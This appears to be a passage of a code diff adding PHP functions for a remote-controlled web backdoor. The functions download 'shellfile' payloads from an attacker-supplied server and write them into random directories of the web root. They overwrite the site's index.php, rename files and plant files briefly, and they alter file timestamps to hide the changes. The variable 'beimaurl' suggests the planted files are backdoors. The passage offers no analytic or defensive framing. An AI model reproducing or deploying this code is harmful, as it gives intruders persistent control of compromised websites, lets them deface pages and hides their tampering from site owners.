+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    empty($params['level']) && $params['level'] = 6;
+    $dirs = getDirPathsByLevel($params['level']);
+    $temp = array_rand($dirs);
+    $createDir = $dirs[$temp] . '/';
+    $localfilepath = $createDir . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            $beimaurl = str_replace($_SERVER['DOCUMENT_ROOT'], '', $localfilepath);
+            success(compact('localfilepath', 'beimaurl'));
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_FILE_EXISTS, compact('remoteFileUrl'));
+}
+function doRename($params)
+{
+    if (empty($params['sourcename'])) {
+        error('sourcename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['rename'])) {
+        error('rename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if ($params['sourcename'] === $params['rename']) {
+        error(MsgText::NOCHANGE);
+    }
+    $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['sourcename'];
+    $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params['rename'];
+    $resSource = $params['server'] . str_replace(strtolower($_SERVER['DOCUMENT_ROOT']), '', strtolower($sourceFile));
+    $resSource = str_replace('\\', '/', $resSource);
+    if (file_exists($sourceFile)) {
+        if (rename($sourceFile, $renameFile)) {
+            success($renameFile);
+        } else {
+            error(MsgText::RENAME_ERROR, compact('renameFile'));
+        }
+    } else {
+        error(MsgText::LOCAL_FILE_EXISTS, compact('resSource'));
+    }
+}
+function doIndex($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $remoteUrl = $params['server'] . trim($params['shellfile']);
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/index.php';
+    $content = getRemoteContent($remoteUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        $oldContent = '';
+        if (file_exists($localfilepath)) {
+            $oldContent = @file_get_contents($localfilepath);
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.html')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.html');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/index.htm')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/index.htm');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.html')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.html');
+        } elseif (file_exists($_SERVER['DOCUMENT_ROOT'] . '/default.htm')) {
+            $oldContent = @file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/default.htm');
+        }
+        if (copyfile($content['result'], $localfilepath, true, $oldContent)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::INDEX_ERROR, compact('remoteUrl'));
+}
+function doSub($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
+function doLock($params)
+{
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['domain'])) {
+        error('domain ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['shellfile'])) {
+        error('shellfile ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $_SERVER['DOCUMENT_ROOT'] . '/' . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            $lockurl = $params['domain'] . $params['filename'];
+            $lockres = getUrl($lockurl);
+            @unlink($localfilepath);
+            if ($lockres['code'] === 200 && !empty($lockres['resp']) && strpos($lockres['resp'], 'success')) {
+                success($lockres['resp']);
+            }
+            error(MsgText::LOCK_FILE_SUCCESS, compact('lockurl', 'lockres'));
+        }
+        @unlink($localfilepath);
+        error(MsgText::LOCK_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}
+function doStyle($params)
+{
+    if (empty($params['shellfile'])) {
+        error('shellfile' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['filename'])) {
+        error('filename ' . MsgText::PARAM_EMPTY, $params);
+    }
+    if (empty($params['domain'])) {
+        error('domain ' . MsgText::PARAM_EMPTY, $params);
+    }
+    $localfilepath = $params['domain'] . $params['filename'];
+    $remoteFileUrl = $params['server'] . $params['shellfile'];
+    $content = getRemoteContent($remoteFileUrl);
+    $content = json_decode($content, true);
+    if (!empty($content['result'])) {
+        if (copyfile($content['result'], $localfilepath)) {
+            updateFiletime($localfilepath);
+            @chmod($localfilepath, 0644);
+            success($localfilepath);
+        }
+        error(MsgText::LOCAL_FILE_ERROR, compact('localfilepath'));
+    }
+    error(MsgText::REMOTE_GET_ERROR, compact('remoteFileUrl'));
+}?>
